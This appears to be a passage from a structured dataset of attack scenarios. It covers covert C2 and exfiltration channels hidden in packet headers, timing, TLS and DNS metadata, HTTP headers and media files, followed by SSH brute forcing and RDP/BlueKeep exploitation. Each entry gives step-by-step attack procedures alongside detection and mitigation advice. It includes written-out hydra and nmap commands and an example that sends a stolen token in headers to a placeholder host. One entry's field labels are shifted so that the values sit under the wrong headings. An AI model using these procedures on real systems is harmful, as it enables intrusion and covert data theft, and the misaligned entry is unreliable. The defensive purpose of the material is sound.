Attack Steps: Step 1: Attacker sets up a web server (Flask, Apache, or Cobalt Strike) configured to run on a non-standard port (e.g., 8443, 8888, 10443).Step 2: Malware is programmed to connect to the C2 using HTTP or HTTPS on this alternate port.Step 3: Outbound traffic is sent over TCP (e.g., https://malicious[.]site:10443/checkin) instead of default 443.Step 4: Many firewalls allow outbound connections on high ports by default, especially if it’s TCP/UDP.Step 5: Protocol inspection tools may miss this activity if rules are only applied to port 80/443 for HTTP/S.Step 6: Attacker configures the web server to serve fake pages or respond with custom headers if scanned manually.Step 7: The beaconing implant sends encrypted data, commands, or file uploads to the C2.Step 8: Defender logs may not parse or log traffic on high ports, leaving blind spots.Step 9: Port rotation or multiple fallback ports are sometimes used to improve resilience.Step 10: This technique is often combined with randomized URIs and fake headers to avoid detection further.
Impact: Bypass of firewall rules, hidden exfil
Detection Method: Monitor uncommon port traffic with HTTP headers; log destination port + protocol for all outbound sessions
Solution: Apply HTTP/S DPI to all ports; block known ports used by malware; alert on HTTPS on high or unknown ports
Tags: Port Evasion, HTTP Beaconing, Non-Standard Protocols

Title: Steganography in HTTP/S Traffic
Attack Type: Data Hidden in Media Transferred via Encrypted HTTP/S
Scenario Description: Malware hides C2 commands or stolen data inside image/audio files and transfers them via HTTPS, making traffic appear as legitimate file sharing or media browsing activity.
Tools Used: Steghide, Outguess, Python, Flask, curl, ngrok
Attack Steps: Step 1: The attacker creates a C2 server (using Python Flask or Nginx) that accepts HTTPS file uploads at a defined endpoint like /imgupload.Step 2: Malware is deployed on the victim machine with a steganography tool like steghide or a custom script.Step 3: Malware hides commands (e.g., “download file X”, “start keylogger”) inside image files such as .png, .jpg, or audio .wav using LSB (least significant bit) encoding or data padding techniques.Step 4: These media files are then sent via an HTTPS POST request to the C2 server, which extracts the hidden data.Step 5: The C2 server may also respond with stego-files that contain updated commands or configuration changes.Step 6: Since the images/audio look and behave like normal media, they bypass most detection tools.Step 7: To remain stealthy, malware names the images with generic names like header.png, profile.jpg, audio.wav, mimicking browser cache traffic.Step 8: Defender traffic logs only show encrypted image file uploads to what appears to be a media server.Step 9: Traditional anti-virus and network inspection tools do not inspect embedded content in media over HTTPS.Step 10: Detection requires stego-aware content inspection or behavioral monitoring on endpoints.
Vulnerability: Lack of media content inspection inside HTTPS
Detection Method: Monitor media uploads/downloads to rare or unknown domains; endpoint media file analysis
Solution: Use EDRs with file integrity checks; scan media for stego; restrict file uploads/downloads to verified domains
Tags: Steganography, HTTPS, Covert Channel, Image Abuse

Title: Peer-to-Peer (P2P) C2 over HTTP/S
Attack Type: Decentralized C2 via Mutual HTTP/S Communication
Scenario Description: Infected systems act as both clients and servers, exchanging commands over HTTPS without central infrastructure, improving resilience and evasion.
Tools Used: Custom Python bots, Nginx, ngrok, Wireshark, netcat
Attack Steps: Step 1: The attacker designs malware that includes both HTTP client and server capabilities (e.g., via Flask server in Python with requests module).Step 2: When the malware infects a device, it opens a local HTTPS listener (on port 8443 or similar) and also connects to other peers listed in its configuration.Step 3: Each infected peer polls other peers using HTTPS GET or POST requests to check for new commands, updates, or configuration changes.Step 4: The peers exchange encrypted JSON blobs that contain task lists, file hashes, or scripts.Step 5: When a new peer is infected, it is added to the list of reachable nodes by the attacker (or via gossip protocols).Step 6: This eliminates the need for a centralized C2 server, making takedown very difficult.Step 7: The malware may also serve static files (like plugins or modules) over HTTPS to other infected nodes.Step 8: All traffic looks like HTTPS between private machines, using ports like 443, 8443, or 9443.Step 9: Defender tools may ignore these if communication is peer-to-peer and encrypted.Step 10: Detection requires monitoring internal HTTPS traffic and unusual service behavior (e.g., endpoint acting as HTTPS server).
Vulnerability: No monitoring of internal HTTPS P2P traffic
Impact: Resilient C2 network, hard to disrupt
Detection Method: Monitor unusual HTTPS activity between internal hosts; detect unauthorized servers
Solution: Disable outbound peer HTTPS unless needed; restrict use of self-hosted web services; inspect TLS SNI/JA3 fingerprints
Tags: P2P C2, HTTPS Swarm, Decentralized Command Flow

Title: Malware Updates via HTTP/S
Attack Type: Delivery of Updates to Malware via HTTPS
Scenario Description: Attackers use HTTPS to deliver version updates, new payloads, or configuration changes to installed malware — mimicking real software update traffic.
Tools Used: Flask, curl, Python, Cobalt Strike, wget, Postman
Attack Steps: Step 1: The attacker sets up an HTTPS server with a route like /update/version.txt and /update/payload.exe.Step 2: Malware on infected systems is designed to check for updates on a timer (e.g., every 6 hours or daily).Step 3: The implant sends an HTTPS GET request to the /update/version.txt file, which contains the latest version number or command hash.Step 4: If a new version is available, the malware sends another GET request to download the latest binary (e.g., payload_v2.exe) or a script.Step 5: The new binary is saved in a hidden or temp directory (e.g., %APPDATA%/mscache/ or /tmp/.up/) and executed silently.Step 6: The original malware may self-delete or stay as a backup launcher.Step 7: Updates are digitally signed by the attacker (or may pretend to be signed), and transmitted via HTTPS, making them appear legitimate.Step 8: Defender traffic logs show benign HTTPS requests to domains like cdn-update[.]xyz, software-service[.]live, etc.Step 9: The update may contain new modules for keylogging, lateral movement, or ransomware deployment.Step 10: Detection requires behavior-based endpoint monitoring and logging of software update behaviors outside approved vendors.
Vulnerability: No validation of unauthorized software updates
Detection Method: Log all software updates; inspect unrecognized update URLs or binary fetches
Solution: Allow updates only from verified domains; use code signing validation; monitor executable downloads
Tags: HTTPS Update, Binary Transfer, Malware Versioning

Title: IP Header Field Abuse
Attack Type: Data Encoding in IP Header Fields
Scenario Description: Attacker hides data bits in unused or overlooked IPv4 header fields (e.g., Identification, Flags, Options) to exfiltrate information or communicate covertly.
Attack Steps: Step 1: The attacker writes a custom Python script using scapy to craft raw IP packets.Step 2: Inside each IP packet, they encode 8 bits of data (e.g., ASCII chars, binary data) into the IP Identification field (16 bits), or into IP Options if supported.Step 3: These fields are rarely validated by firewalls or IDS and usually remain unchanged unless packet fragmentation occurs.Step 4: The attacker sends a stream of these custom IP packets from the compromised host to an external receiver (attacker-controlled server).Step 5: On the receiver side, the attacker runs a packet sniffer (e.g., tcpdump, Wireshark, or custom Python) to extract the Identification field and reconstruct the exfiltrated data.Step 6: This works even if no TCP/UDP payload is present, allowing stealth communication.Step 7: Since most security tools focus on payloads or headers like IP address/TTL, the abuse of rarely inspected header fields goes unnoticed.Step 8: Repeated packets sent over time can leak files or commands without raising alarms.Step 9: Advanced versions include XOR encoding or compression before embedding.Step 10: Detection requires strict parsing and inspection of all IP header fields, often not enabled by default.
Vulnerability: Uninspected or unused IP header fields
Detection Method: Monitor anomalies in IP Identification, Options, or Flags; alert on non-standard header values
Solution: Enable deep packet inspection of IP headers; normalize or rewrite unused fields in edge routers
Tags: IP Covert Channel, Header Abuse, Raw Packet Exfiltration

Title: TCP/UDP Port Encoding
Attack Type: Data Encoded in Source/Destination Port Fields
Scenario Description: Malware encodes data into TCP or UDP source/destination port numbers across multiple packets — a stealthy method of transmission not reliant on payloads.
Attack Steps: Step 1: The attacker writes a script that sends TCP or UDP packets to the C2 server.Step 2: In each packet, a portion of the exfiltrated data is encoded into the source port (e.g., 50000 = ‘H’, 50001 = ‘E’, etc.).Step 3: The destination IP/port remains static so the firewall allows it (e.g., UDP 53 to mimic DNS).Step 4: Attacker sends a series of these packets from the compromised system at set intervals to avoid detection.Step 5: The C2 server listens and logs incoming packets, extracting the encoded port values to reconstruct the message.Step 6: This method is payload-free — meaning AV/IDS won’t flag it as the content of the packet is empty or benign.Step 7: Advanced versions might use dual encoding (source and dest port together) to increase bandwidth.Step 8: The attack continues in the background until data is fully sent.Step 9: Firewalls rarely block packets based on dynamic port ranges unless configured explicitly.Step 10: Detection requires alerting on high volumes of packets with changing ports and no payload activity.
Vulnerability: Port fields are trusted, rarely inspected
Detection Method: Monitor port usage trends; detect unexpected traffic to static destinations with changing source ports
Solution: Limit egress traffic by port and volume; alert on uncommon high-range source ports
Tags: Port Covert Channel, TCP UDP Abuses

Title: TTL (Time To Live) Encoding
Attack Type: Covert Signaling via IP TTL Field
Scenario Description: Malware uses variable TTL values in outgoing packets to encode data, which is then decoded by an external observer by reading TTL values instead of payloads.
Attack Steps: Step 1: Attacker writes a script using scapy to generate IP packets with specific TTL values — e.g., TTL=42 = binary 101010, TTL=65 = ASCII A.Step 2: Malware implants are programmed to send a continuous stream of ICMP, TCP, or UDP packets with crafted TTL values.Step 3: These packets are sent to an external server under attacker control or even to “dead” IPs if monitored on the wire.Step 4: The attacker sniffs the traffic using Wireshark or tcpdump, extracting TTL values from each packet to reconstruct messages.Step 5: As TTL is just a hop counter, most firewalls do not inspect or log its value.Step 6: No payload is required — entire data stream is encoded in TTL headers.Step 7: Advanced variants may encode commands, beacon responses, or identifiers.Step 8: TTL can be randomized slightly to mimic real traffic, adding stealth.Step 9: This method works best in egress-heavy environments (e.g., cloud, enterprise endpoints).Step 10: Detection requires logging raw IP header values or analyzing unusual TTL entropy.
Vulnerability: TTL values are not normally monitored
Detection Method: Analyze statistical TTL distribution from endpoints; flag high entropy or repetition patterns
Solution: Normalize TTLs at gateway; discard TTLs outside expected range
Tags: TTL Encoding, Header Signal, Covert C2

Title: IP Packet Fragment Offset
Attack Type: Fragment Offset Field Manipulation for Data Encoding
Scenario Description: Data is broken into IP fragments and exfiltrated by encoding bits in the Fragment Offset field — used to smuggle info across firewalls and detection systems.
Tools Used: scapy, Wireshark, Linux fragroute tool, Python sockets
Attack Steps: Step 1: Attacker writes a script using scapy or fragroute to send fragmented IP packets.Step 2: Instead of using normal fragmentation, attacker encodes data into the Fragment Offset field (e.g., offset=256 = char A, offset=257 = B, etc.).Step 3: Each fragment is part of an “incomplete” IP packet — payload is not important; the offset is what carries the message.Step 4: These fragments are sent to a known C2 IP that logs them or are just dropped after sniffing at the perimeter.Step 5: No full packet assembly needed — attacker extracts offset fields directly from raw capture.Step 6: IDS/IPS tools that reassemble packets miss this because no full payload is reconstructed.Step 7: Since fragmenting IP packets is common (especially over VPN/tunnels), this attack can blend with legitimate noise.Step 8: Fragments may include junk payloads to disguise the real pattern.Step 9: Only deep traffic inspection or raw IP packet logs reveal this pattern.Step 10: Defender must log fragmentation behavior across sessions and flag unusually structured fragments.
Detection Method: Detect high frequency of fragmented packets; alert on unusual fragment offsets
Solution: Disable IP fragmentation when possible; log and reassemble fragments for inspection
Tags: IP Fragmentation, Offset Abuse, Header Channel

Title: TCP Sequence Number Encoding
Attack Type: Covert Data in TCP Sequence Numbers
Scenario Description: Data is encoded in the Sequence Number field of TCP packets, allowing malware to transmit data to a listener without altering payloads.
Attack Steps: Step 1: The attacker writes a script using scapy to craft TCP packets with manually set sequence numbers.Step 2: Each Sequence Number field is used to hold a chunk of encoded data (e.g., 0x41424344 = "ABCD").Step 3: The destination IP is set to the C2 server’s IP, and the TCP flags are typically SYN or ACK, so firewalls let them through.Step 4: The C2 server captures these packets using tcpdump or Wireshark and extracts the Sequence Number field.Step 5: The received sequence numbers are decoded back into bytes/ASCII characters, reconstructing the original message.Step 6: No payload or application-layer data is required — just crafted TCP headers.Step 7: Since sequence numbers change in legitimate TCP traffic, this abuse blends in well.Step 8: Malware may send these packets at regular intervals or embed them in failed connection attempts.Step 9: This technique is useful even when payload inspection is active — it bypasses L7 DPI.Step 10: Detection involves flagging packets with consistent structure but strange sequence number patterns.
Vulnerability: Lack of inspection on TCP header fields
Detection Method: Detect fixed or patterned sequence numbers; analyze TCP handshake abnormalities
Solution: Normalize headers at gateway; block malformed TCP handshakes unless part of valid sessions
Tags: TCP Header Abuse, SeqNum C2, Packet Encoding

Title: TCP Window Size Field
Attack Type: Encoding in TCP Window Size Field
Scenario Description: Malware encodes control signals or data bits in the TCP Window Size field — often overlooked by standard inspection tools.
Attack Steps: Step 1: Attacker creates a Python script that crafts TCP packets where the Window Size field (16-bit) is set to represent data (e.g., 0x4142 = "AB").Step 2: These TCP packets are sent to the C2 server periodically, e.g., one every 5 seconds.Step 3: The C2 server captures incoming TCP traffic and reads the Window Size field from each packet header.Step 4: The malware can use SYN, ACK, or PSH packets — firewalls often don’t inspect Window Size in these.Step 5: The attacker converts the Window Size values back to readable text using scripts.Step 6: The malware sends empty payloads, keeping packet size small and stealthy.Step 7: This method is resistant to payload analysis and mimics TCP session traffic.Step 8: To enhance stealth, values can be XOR-encoded or sent in a pseudo-random order.Step 9: Some variants change TTL and Window Size together to mimic different OS stacks.Step 10: Most IDS/IPS don’t trigger on these patterns unless header-level anomaly detection is active.
Vulnerability: Window size rarely validated in TCP headers
Detection Method: Monitor TCP packets with inconsistent or patterned window size values
Solution: Normalize TCP headers; inspect header entropy; flag window values outside OS-specific profiles
Tags: TCP Window Abuse, Header C2, Data-in-Transport-Header

Title: TCP Flags Bit Encoding
Attack Type: Covert Binary Channel via TCP Flags Combinations
Scenario Description: Malware encodes 1s and 0s using combinations of TCP flags (SYN, FIN, RST, ACK), forming a binary C2 communication protocol over raw TCP headers.
Attack Steps: Step 1: The attacker defines a binary encoding scheme using TCP flags:- SYN+ACK = 00- RST = 01- FIN+ACK = 10- ACK only = 11Step 2: Each packet is crafted using this scheme and sent to the C2 listener.Step 3: On the receiving side, the attacker runs a script to capture incoming packets and read the TCP flags.Step 4: The sequence of flag combinations reconstructs the binary data stream.Step 5: No payload is used, only the manipulation of the flag bits.Step 6: Firewalls allow these packets because they appear to be part of normal TCP operations.Step 7: The malware may send packets to random ports to further evade protocol analysis.Step 8: This channel is low-bandwidth but highly stealthy.Step 9: Detection is very difficult without custom behavioral rules on flag combinations.Step 10: Most endpoint agents do not inspect flags unless the session causes an error or crash.
Vulnerability: TCP flags are rarely analyzed in combination
Detection Method: Detect abnormal TCP flag combos (e.g., SYN+FIN); flag rare flag-only packets
Solution: Build firewall rules to drop packets with abnormal flags; enable deep header inspection
Tags: TCP Flag Encoding, Stealth Channel, Protocol Abuses

Title: ICMP Identifier & Sequence Abuse
Attack Type: Data Encoding in ICMP Echo Identifiers/Sequence
Scenario Description: Data is encoded in ICMP Identifier and Sequence Number fields — typically used in ping requests — for a stealthy, firewall-friendly covert channel.
Attack Steps: Step 1: Attacker uses hping3 or scapy to craft ICMP Echo Requests (ping) with custom values in the Identifier (16-bit) and Sequence Number (16-bit) fields.Step 2: The malware implant sends these ICMP packets to the C2 IP over time, each carrying a small data chunk (e.g., ASCII char in ID = 0x41 → ‘A’).Step 3: The C2 server runs a sniffer and extracts the Identifier/Sequence fields to reconstruct the message.Step 4: Because ping is allowed in most firewalls and networks, this channel is rarely blocked.Step 5: The attacker can send replies back using Echo Reply packets with embedded commands in the same fields.Step 6: No actual payload is used — the header fields act as the data carrier.Step 7: Malware can limit the rate (1 ping/min) to evade detection or blend with monitoring tools.Step 8: To stay stealthy, malware may randomize destinations or interleave with legit pings.Step 9: These fields are never inspected by traditional IDS rulesets.Step 10: Detection requires deep ICMP header logging and analysis of Identifier/Sequence values across time.
Vulnerability: ICMP headers are never inspected for content
Impact: Hidden data transfer via common protocol
Detection Method: Analyze ICMP fields for entropy/patterns; alert on consistent ID/Seq combos across time
Solution: Rate-limit ICMP; inspect Echo headers; deny unknown ping targets; whitelist known monitoring sources
Tags: ICMP Abuse, Ping Tunneling, Header Encoding

Title: DNS Query IDs or TTL Fields
Scenario Description: Malware embeds data into DNS Query ID or TTL fields of outbound DNS packets — stealthy because payload remains normal while metadata is abused for signaling.
Attack Steps: Step 1: Attacker writes a script to generate fake DNS requests using scapy or dig, manually setting the 16-bit Query ID (e.g., 0x4142 = ‘AB’) or the TTL field.Step 2: Each query is sent to a real or fake domain (e.g., data.leak.com) controlled by the attacker, but the payload is meaningless — the metadata carries the real signal.Step 3: The C2 server receives or sniffs these DNS packets and extracts the encoded values from the Query ID or TTL field.Step 4: Data is reconstructed bit-by-bit as the stream of requests continues.Step 5: Malware may interleave real and fake DNS queries to reduce detection.Step 6: TTL-based encoding uses predefined TTL values to represent data (e.g., TTL=50 = ‘A’, TTL=51 = ‘B’).Step 7: Firewalls and DNS resolvers usually ignore TTL/Query ID as long as format is valid.Step 8: Attack continues indefinitely or periodically, embedding beacon status or exfiltrated data.Step 9: Common DNS monitoring tools focus on domain names, not metadata fields.Step 10: Detection requires full DNS logging with visibility into Query IDs and TTLs, which most networks lack by default.
Vulnerability: Metadata fields not inspected in DNS
Detection Method: Monitor for high-entropy or patterned Query IDs; detect TTL anomalies within DNS traffic
Solution: Deploy DNS proxies with metadata inspection; limit DNS to trusted servers; reject malformed queries
Tags: DNS Covert Channel, Metadata Abuse, TTL Tunneling

Title: Packet Inter-Arrival Timing
Scenario Description: Data is encoded by modulating the time intervals between sent packets (e.g., short gap = 0, long gap = 1). This avoids modifying packet content entirely.
Tools Used: Python, Scapy, Tshark, ping, NTP sync
Attack Steps: Step 1: Attacker writes a script that sends packets (e.g., ICMP, TCP, UDP) at carefully timed intervals.Step 2: A “timing map” is created (e.g., wait 1s = bit 0, wait 3s = bit 1) to encode binary data.Step 3: Malware implant sends a fixed-size, normal-looking packet repeatedly — but varies the time delay between them according to the data.Step 4: On the receiving side (C2), the attacker uses tshark or a custom sniffer to record timestamps of received packets.Step 5: The delays are interpreted back into binary format using the predefined map.Step 6: This method leaves all header fields and payloads untouched, making detection very difficult.Step 7: Can be layered on top of normal traffic — e.g., pings or HTTP requests — to blend into background noise.Step 8: Requires accurate time sync (via NTP) and low network jitter for reliability.Step 9: Bandwidth is very low, but useful for stealth commands or small data leaks.Step 10: Detection involves tracking timing patterns and entropy between packets, which most systems don’t analyze.
Detection Method: Analyze packet timing patterns using flow data or PCAPs; detect fixed-pattern delays
Solution: Deploy flow analytics tools with anomaly detection; flag consistent packet timing with no payload variation
Tags: Timing Channel, Delay Encoding, Covert Communication

Title: Packet Size Modulation
Scenario Description: Malware encodes data in the length of the entire packet (e.g., packet size 512 = 0, 1024 = 1) to transmit data without touching header or payload content.
Attack Steps: Step 1: Attacker defines a size-to-bit mapping scheme, e.g., 512-byte packet = bit 0, 1024-byte packet = bit 1.Step 2: Malware constructs packets of exact length using padding or dummy data (e.g., use UDP or TCP with padded payloads).Step 3: Each packet is sent from infected host to the attacker’s server or a collaborator on the same network.Step 4: The attacker captures the traffic and reads the total packet size (L2/L3) from each received packet.Step 5: The size sequence is interpreted into binary → ASCII → message.Step 6: Firewalls and IDS tools don’t usually alert on fixed-size traffic unless thresholds are exceeded.Step 7: Variants may use gradual size increase (512, 513, …) to encode full bytes instead of bits.Step 8: Since payload and headers look normal, only size patterns reveal the covert activity.Step 9: Malware may use common protocols (DNS, HTTP) to disguise this.Step 10: Detection requires full packet capture and size trend analysis, which is rarely active in real-time.
Vulnerability: No size-based filtering on most networks
Impact: Covert signal using standard traffic formats
Detection Method: Analyze PCAPs for recurring, non-random size patterns; alert on fixed-size packet repetition
Solution: Limit packet size ranges for known protocols; flag unexpected consistent-size traffic across sessions
Tags: Packet Size C2, Encoding via MTU, Length-Based Channel

Title: ARP Fields Encoding
Attack Type: Covert Channel Using ARP Hardware/Protocol Fields
Scenario Description: Malware encodes bits into ARP packet fields (e.g., hardware type, opcode, sender MAC) and broadcasts them on local network — useful for lateral C2 or beaconing.
Attack Steps: Step 1: Attacker writes a script using scapy to send custom ARP packets with altered or non-standard field values.Step 2: For example, opcode=1 may represent 0, opcode=2 may represent 1, or the attacker may use specific sender MAC suffixes like :01, :02, etc. to carry data.Step 3: The malware sends these ARP packets repeatedly on the LAN (as ARP is link-local), encoding small amounts of info.Step 4: Another infected host or a network sniffer collects these ARP packets and decodes the message from the altered fields.Step 5: ARP has no payload, and is often ignored by network logs, making this method stealthy.Step 6: Malware may use gratuitous ARP or ARP replies to blend in with broadcast noise.Step 7: To enhance stealth, attacker may rotate MAC addresses to simulate multiple devices.Step 8: This method is mainly used for local peer-to-peer C2, lateral movement signaling, or persistence.Step 9: Most endpoint defenses don’t monitor ARP traffic unless targeted for spoofing.Step 10: Detection requires ARP monitoring tools and field-level inspection on switches or ARP logs.
Vulnerability: ARP fields are unvalidated and insecure
Detection Method: Monitor for abnormal ARP activity or field patterns; enable MAC tracking at access switches
Solution: Use ARP inspection (DAI) on switches; log and validate ARP ops against known hardware
Tags: ARP Covert C2, MAC Signal, Broadcast Abuse

Title: HTTP Header Manipulation
Scenario Description: Malware encodes data in non-standard or obscure HTTP headers (e.g., User-Agent, Referer, X-Forwarded-For, Cookie) to exfiltrate info or receive commands.
Tools Used: Burp Suite, Curl, Python Requests, Wireshark, Fiddler
Attack Steps: Step 1: Attacker writes a script (Python requests or curl) that sends HTTP requests to a C2 server or decoy domain (e.g., example.com/upload).Step 2: Instead of sending the data in the body or query string, the malware hides it inside HTTP headers:- `User-Agent: Mozilla/5.0
Target Type:
EXFIL_DATA_HERE
- Cookie: SESSION=xyz; KEY=stolen_token
- Referer: https://legit.site/stolen_data`Step 3: The HTTP request appears normal to firewalls and proxies because these headers are always present.Step 4: The C2 server reads the incoming request and parses these headers to extract the hidden information.Step 5: Alternatively, the malware polls the server via GET/POST and reads new instructions from the Set-Cookie, X-Command, or other custom headers in the response.Step 6: To avoid detection, the malware randomizes header order and uses slight variations (e.g., changing casing, adding junk values).Step 7: These requests can be sent over HTTPS to encrypt the content.Step 8: Detection is difficult without full header logging or header-based anomaly analysis.Step 9: The same trick can be used on internal C2 servers or inside cloud apps.Step 10: Proxy logs usually ignore uncommon headers, which helps attackers stay hidden.
MITRE Technique: Standard headers not validated or monitored
Detection Method: Covert exfiltration, bypass traditional DPI
Solution: Enable full HTTP header logging; detect anomalies in User-Agent, Cookie, and Referer strings
Tags: Sanitize inbound headers on web servers; filter odd headers at proxies; apply header field whitelists
Source: HTTP Covert Channel, Custom Header C2, DPI Bypass

Title: TLS Handshake Metadata
Attack Type: Signal via TLS SNI, Padding, and Session ID
Scenario Description: Malware embeds data in metadata fields during the TLS handshake (e.g., SNI, session ID) that are visible before encryption, bypassing SSL inspection tools.
Tools Used: OpenSSL, Wireshark, Python SSL sockets, mitmproxy, Zeek
Attack Steps: Step 1: Attacker builds or modifies a TLS client (e.g., Python with ssl or OpenSSL) that connects to a C2 server.Step 2: During the TLS handshake, certain fields are sent in plaintext before encryption begins:- SNI (Server Name Indication): Common field to specify hostname (e.g., attacker sends data123.example.com, where data123 encodes message).- Session ID: 32-byte value that can be crafted manually to contain data.- Padding / Extensions: TLS extensions (like supported ciphers) can be reordered or used as covert signaling.Step 3: The malware modifies these metadata fields to encode beacon signals, keys, or stolen values.Step 4: The receiving C2 parses these fields directly from incoming TLS handshakes.Step 5: Once the handshake is complete, the connection may drop, or continue with fake traffic.Step 6: These handshake metadata fields pass through most SSL inspection boxes because encryption hasn't started yet.Step 7: Security tools that don’t log or parse SNI/session ID miss the exfiltration entirely.Step 8: Variants may use many subdomains (msg1.c2.com, msg2.c2.com) to encode sequences.Step 9: TLS handshake anomalies are rare in normal traffic, so they can be spotted with proper tooling.Step 10: This method is extremely stealthy and has been seen in nation-state malware and APTs.
Vulnerability: Metadata is exposed, but not inspected
Detection Method: Monitor TLS handshakes for unusual SNI/session ID/padding; use Zeek to parse TLS metadata
Solution: Enable TLS handshake logging; use strict SNI/domain validation at proxies
Tags: TLS Metadata Abuse, SNI Signaling, Encrypted C2

Title: Covert Channels in VPN Metadata
Attack Type: Exploit IP Headers Outside VPN Tunnel
Scenario Description: Malware leaks data by embedding it in the outer IP headers (e.g., ToS, TTL, ID) of encrypted VPN packets, exploiting fields not protected by the VPN tunnel.
Attack Steps: Step 1: Malware uses a VPN tunnel (OpenVPN/IPSec/WireGuard) to secure traffic between compromised host and C2.Step 2: Instead of embedding data inside the encrypted payload, attacker modifies metadata in the outer IP headers of VPN packets:- TTL: Encodes bits by varying TTL values.- ToS/DSCP: Embed numeric values to signal commands or status.- Identification field: Carries short messages (e.g., 0x4142 = ‘AB’).Step 3: These headers remain visible because they are required for routing and are not encrypted by the VPN.Step 4: The attacker monitors traffic at the C2 server and extracts the encoded values.Step 5: This allows exfiltration even if the VPN payload is fully encrypted.Step 6: VPN logs and endpoint security solutions rarely check outer headers.Step 7: Malware may send dummy ping or keepalive packets at regular intervals with encoded header values.Step 8: Detection is challenging unless you're capturing and analyzing raw VPN transport traffic.Step 9: Network anomalies can reveal suspiciously modified TTL or ToS patterns.Step 10: Effective mostly in split-tunnel setups or when malware uses its own embedded VPN module.
Impact: Hidden exfil even through VPN-protected flows
Detection Method: Analyze outer headers of VPN packets; detect abnormal TTL, ToS, ID patterns
Solution: Use deep packet inspection at VPN endpoints; apply header normalization filters
Tags: VPN Tunnel Abuse, Metadata Exfiltration, Split Tunneling

Title: MAC Address Field Encoding
Attack Type: Covert Data in Ethernet MAC Addresses
Scenario Description: Data is encoded in the last bytes of MAC addresses in outgoing frames, often used in LAN-based signaling or beaconing.
Attack Steps: Step 1: Attacker writes a Python script using scapy or uses ip link set to change the source MAC address of outgoing Ethernet frames.Step 2: The last 2–3 bytes of the MAC address are altered to embed ASCII or hex-encoded data (e.g., AA:BB:CC:00:41:42 → “AB”).Step 3: The malware sends ARP broadcasts, ICMP packets, or any Ethernet frame using this spoofed MAC address.Step 4: Another host or attacker-controlled sniffer on the same LAN listens and logs MAC addresses of incoming traffic.Step 5: Each frame's source MAC is parsed, and the trailing bytes are converted back into characters to reconstruct the full message.Step 6: Since MAC spoofing is possible on most OSes, this does not require special permissions beyond raw socket access.Step 7: The attacker can rotate between MACs, flood fake devices, or interleave legit traffic to avoid detection.Step 8: Detection is difficult unless the network monitors MAC address anomalies or tracks devices closely.Step 9: MAC spoofing is often allowed on Wi-Fi and Ethernet by default unless explicitly locked by switch ACLs or NAC.Step 10: This technique is limited to local networks but very stealthy for LAN-based covert channels or P2P C2.
Detection Method: Log and analyze MACs for pattern anomalies; flag MAC addresses with unknown/unregistered prefixes
Solution: Enforce port security (MAC binding); block unregistered MACs; use NAC (Network Access Control)
Tags: MAC Field Encoding, LAN C2, Ethernet Covert Channel

Title: Flow Label in IPv6
Attack Type: Covert Channel via IPv6 Flow Label
Scenario Description: Malware uses the 20-bit Flow Label field in IPv6 headers to transmit or signal data to a C2 server, bypassing traditional IPv4-only inspection tools.
Attack Steps: Step 1: Attacker or malware prepares an IPv6-capable host with raw packet crafting tools like Scapy.Step 2: The attacker chooses a data encoding method (e.g., each Flow Label value encodes a binary pattern — Flow Label = 0xABCD1 → “1010...”).Step 3: The malware sends legitimate-looking IPv6 packets (e.g., ICMPv6 pings, TCP SYNs, etc.), modifying only the Flow Label field for each message.Step 4: The attacker sniffs or logs these IPv6 packets from a passive listener (on the LAN or at a C2 VPS), then extracts and decodes the flow label values to reconstruct the hidden message or beacon.Step 5: Since Flow Labels are rarely used in real-world IPv6 deployments, changes are often ignored by firewalls and inspection tools.Step 6: The attack continues silently over time, potentially embedded in other network traffic.Step 7: Detection is difficult as many security tools do not parse IPv6 flow labels.Step 8: Defender can use Wireshark or Zeek with flow label analysis to detect pattern anomalies or misuse.Step 9: The attacker may rotate IPv6 source addresses or destinations to avoid correlation.Step 10: This covert channel is effective in IPv6-only or dual-stack environments, especially with misconfigured firewalls.
Vulnerability: Flow Label field unmonitored in IPv6 headers
Detection Method: Use flow label-aware packet capture tools (Zeek, Suricata); alert on uncommon label values
Solution: Enforce IPv6 traffic inspection; log flow label usage; drop traffic with non-zero Flow Labels
Tags: IPv6 Covert Channel, Flow Label Abuse, Exfiltration

Title: SSH Brute Force on Port 22
Scenario Description: Public SSH port is targeted using common username/password combos to gain shell access — especially on VPS or exposed servers.
Tools Used: Hydra, Nmap, Metasploit, John, SSH client
Attack Steps: Step 1: Attacker uses nmap -p 22 -Pn <target> to confirm SSH port is open on public IP (e.g., 0.0.0.0/0 exposure).Step 2: Uses a brute force tool like hydra or medusa with common usernames (root, admin, ubuntu) and password lists (e.g., rockyou.txt, top1000.txt).Step 3: Executes: hydra -l root -P rockyou.txt ssh://<target-ip> to start brute force attack.Step 4: On success, the attacker receives shell access to the server, bypassing application-level defenses.Step 5: Attack may also check for known weak keys or reused credentials from leaked databases (e.g., using john --wordlist on known key hashes).Step 6: Once inside, attacker plants a backdoor (e.g., add new user, add SSH key to ~/.ssh/authorized_keys).Step 7: Privilege escalation may follow via local exploits (dirtycow, sudo -l, cron abuse, etc.).Step 8: Defender detection includes monitoring SSH logs (/var/log/auth.log) for failed login bursts.Step 9: Rate limiting or fail2ban can detect/block this automatically.Step 10: Hardened systems with key-only login, disabled root login, or geo-IP blocks reduce brute-force success rate.
Vulnerability: Exposed SSH with password login enabled
Detection Method: Monitor failed logins, use fail2ban, analyze /var/log/auth.log
Solution: Disable password login; enforce SSH keys; restrict root login; use port knocking or VPN-only SSH access
Tags: SSH Brute Force, Hydra, Credential Stuffing

Title: RDP Exploit on Port 3389
Scenario Description: RDP exposed to internet can be exploited via vulnerabilities (e.g., BlueKeep) or brute-force login attempts to gain access.
Tools Used: Nmap, Metasploit, CVE-2019-0708 Exploits, xfreerdp, Hydra
Attack Steps: Step 1: Attacker uses nmap -p 3389 -Pn <target> or shodan.io to find publicly exposed RDP hosts.Step 2: Runs fingerprinting tools like rdpscan or nmap -sV to identify Windows version and determine if BlueKeep (CVE-2019-0708) is exploitable.Step 3: If vulnerable, attacker uses Metasploit with the rdp_bluekeep_rce module to deliver payload (e.g., reverse shell, meterpreter).Step 4: For brute-force, attacker uses hydra or xfreerdp in a loop to test common username/password combos.Step 5: On successful login or exploit, attacker gains full GUI access and may disable firewall, steal files, or install persistence.Step 6: Lateral movement possible using credentials or clipboard sharing.Step 7: Defender must monitor Windows event logs (e.g., ID 4625 for failed logins) and restrict RDP access via firewalls.Step 8: Detection can include RDP honeypots or intrusion prevention systems alerting on login attempts from abnormal geolocations.Step 9: Ensure patching of RDP servers against BlueKeep and similar exploits.Step 10: Enforce 2FA or RDP Gateway to prevent direct internet exposure.
Vulnerability: RDP exposed with vulnerable version or brute
Detection Method: Monitor RDP login logs, detect multiple failed sessions, use geo-IP correlation
